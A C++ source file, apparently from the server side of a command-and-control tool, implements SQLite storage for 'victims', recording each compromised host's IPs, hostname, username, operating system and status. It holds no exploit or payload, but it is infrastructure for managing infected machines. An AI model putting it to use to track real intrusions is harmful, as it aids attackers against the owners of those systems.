#include "VictimRepository.hpp"
#include "VictimDAO.hpp"
#include "sqlite3.h"

#include <sstream>
#include <iostream>
#include <iomanip>
#include <ctime>

//--------------------------------
//
//--------------------------------
VictimRepository::VictimRepository(const std::string& db_path) {
    set_db_path(db_path);
    ensure_table();
}

//--------------------------------
//
//--------------------------------
void VictimRepository::ensure_table() {
    auto db = open_readwrite();

    db.exec(R"(
        CREATE TABLE IF NOT EXISTS victims (
            victim_id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_uid TEXT UNIQUE NOT NULL,
            internal_ip TEXT,
            external_ip TEXT,
            hostname TEXT,
            username TEXT,
            operating_system TEXT,
            last_update BIGINT,
            status INTEGER
        );
    )");
}

//--------------------------------
//
//--------------------------------
std::vector<VictimDAO> VictimRepository::list() const {
    auto db = open_readwrite();

    std::vector<VictimDAO> results;
    sqlite3* h = db.getHandle();
    sqlite3_stmt* stmt = nullptr;

    const char* sql = "SELECT victim_id, victim_uid, internal_ip, external_ip, hostname, "
                      "username, operating_system, last_update, status FROM victims "
                      "ORDER BY last_update DESC;";

    if (sqlite3_prepare_v2(h, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        throw SqliteException("prepare failed: " + std::string(sqlite3_errmsg(h)));
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        VictimDAO victim;

        victim.id = sqlite3_column_int64(stmt, 0);

        const char* uid_ptr = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        victim.uid = uid_ptr ? uid_ptr : "";

        const char* internal_ip_ptr = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
        victim.internal_ip = internal_ip_ptr ? internal_ip_ptr : "";

        const char* external_ip_ptr = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3));
        victim.external_ip = external_ip_ptr ? external_ip_ptr : "";

        const char* hostname_ptr = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 4));
        victim.hostname = hostname_ptr ? hostname_ptr : "";

        const char* username_ptr = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5));
        victim.username = username_ptr ? username_ptr : "";

        const char* os_ptr = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 6));
        victim.operating_system = os_ptr ? os_ptr : "";

        victim.last_update = sqlite3_column_int64(stmt, 7);

        victim.status = sqlite3_column_int(stmt, 8);

        results.push_back(std::move(victim));
    }

    sqlite3_finalize(stmt);
    return results;
}

//--------------------------------
//
//--------------------------------
std::optional<VictimDAO> VictimRepository::get(int64_t id) const {
    auto db = open_readonly();

    std::optional<VictimDAO> opt;
    sqlite3* h = db.getHandle();
    sqlite3_stmt* stmt = nullptr;
    const char* sql = "SELECT victim_id, victim_uid, internal_ip, external_ip, hostname, "
                      "username, operating_system, last_update, status "
                      "FROM victims WHERE victim_id = ? LIMIT 1;";

    if (sqlite3_prepare_v2(h, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        throw SqliteException("prepare failed");
    }

    sqlite3_bind_int64(stmt, 1, id);

    if (sqlite3_step(stmt) == SQLITE_ROW) {
        VictimDAO victim;
        victim.id = sqlite3_column_int64(stmt, 0);
        victim.uid = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        victim.internal_ip = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
        victim.external_ip = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3));
        victim.hostname = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 4));
        victim.username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5));
        victim.operating_system = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 6));
        victim.last_update = sqlite3_column_int64(stmt, 7);
        victim.status = sqlite3_column_int(stmt, 8);
        opt = victim;
    }

    sqlite3_finalize(stmt);
    return opt;
}

//--------------------------------
//
//--------------------------------
std::optional<VictimDAO> VictimRepository::get(const UUID& uid) const {
    auto db = open_readonly();

    std::optional<VictimDAO> opt;
    sqlite3* h = db.getHandle();
    sqlite3_stmt* stmt = nullptr;
    const char* sql = "SELECT victim_id, victim_uid, internal_ip, external_ip, hostname, "
                      "username, operating_system, last_update, status "
                      "FROM victims WHERE victim_uid = ? LIMIT 1;";

    if (sqlite3_prepare_v2(h, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        throw SqliteException("prepare failed");
    }

    sqlite3_bind_text(stmt, 1, uid.c_str(), -1, SQLITE_TRANSIENT);

    if (sqlite3_step(stmt) == SQLITE_ROW) {
        VictimDAO victim;
        victim.id = sqlite3_column_int64(stmt, 0);
        victim.uid = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        victim.internal_ip = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
        victim.external_ip = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3));
        victim.hostname = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 4));
        victim.username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5));
        victim.operating_system = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 6));
        victim.last_update = sqlite3_column_int64(stmt, 7);
        victim.status = sqlite3_column_int(stmt, 8);
        opt = victim;
    }

    sqlite3_finalize(stmt);
    return opt;
}

//--------------------------------
//
//--------------------------------
VictimDAO VictimRepository::create(const VictimDAO& victim) {
    auto db = open_readwrite();

    sqlite3* h = db.getHandle();
    sqlite3_stmt* stmt = nullptr;
    const char* sql = "INSERT INTO victims (victim_uid, internal_ip, external_ip, hostname, "
                      "username, operating_system, last_update, status) "
                      "VALUES (?, ?, ?, ?, ?, ?, ?, ?);";

    if (sqlite3_prepare_v2(h, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        throw SqliteException("prepare failed");
    }

    UUID uid = victim.uid.empty() ? generate_uuid() : victim.uid;

    sqlite3_bind_text(stmt, 1, uid.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 2, victim.internal_ip.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 3, victim.external_ip.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 4, victim.hostname.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 5, victim.username.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 6, victim.operating_system.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int64(stmt, 7, victim.last_update);
    sqlite3_bind_int(stmt, 8, victim.status);

    if (sqlite3_step(stmt) != SQLITE_DONE) {
        sqlite3_finalize(stmt);
        throw SqliteException("insert failed");
    }

    sqlite3_finalize(stmt);
    int64_t id = sqlite3_last_insert_rowid(h);

    VictimDAO result = victim;
    result.id = id;
    result.uid = uid;
    return result;
}

//--------------------------------
//
//--------------------------------
std::optional<VictimDAO> VictimRepository::update(int64_t id, const VictimDAO& victim) {
    auto db = open_readwrite();

    sqlite3* h = db.getHandle();
    sqlite3_stmt* stmt = nullptr;
    const char* sql = "UPDATE victims SET internal_ip = ?, external_ip = ?, hostname = ?, "
                      "username = ?, operating_system = ?, last_update = ?, status = ? "
                      "WHERE victim_id = ?;";

    if (sqlite3_prepare_v2(h, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        throw SqliteException("prepare failed");
    }

    sqlite3_bind_text(stmt, 1, victim.internal_ip.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 2, victim.external_ip.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 3, victim.hostname.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 4, victim.username.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 5, victim.operating_system.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int64(stmt, 6, victim.last_update);
    sqlite3_bind_int(stmt, 7, victim.status);
    sqlite3_bind_int64(stmt, 8, id);

    if (sqlite3_step(stmt) != SQLITE_DONE) {
        sqlite3_finalize(stmt);
        return std::nullopt;
    }

    sqlite3_finalize(stmt);
    return get(id);
}

//--------------------------------
//
//--------------------------------
bool VictimRepository::remove(int64_t id) {
    auto db = open_readwrite();

    sqlite3* h = db.getHandle();
    sqlite3_stmt* stmt = nullptr;
    const char* sql = "DELETE FROM victims WHERE victim_id = ?;";

    if (sqlite3_prepare_v2(h, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        throw SqliteException("prepare failed");
    }

    sqlite3_bind_int64(stmt, 1, id);

    if (sqlite3_step(stmt) != SQLITE_DONE) {
        sqlite3_finalize(stmt);
        return false;
    }

    sqlite3_finalize(stmt);
    return sqlite3_changes(h) > 0;
}

//--------------------------------
//
//--------------------------------
void VictimRepository::commit() {
}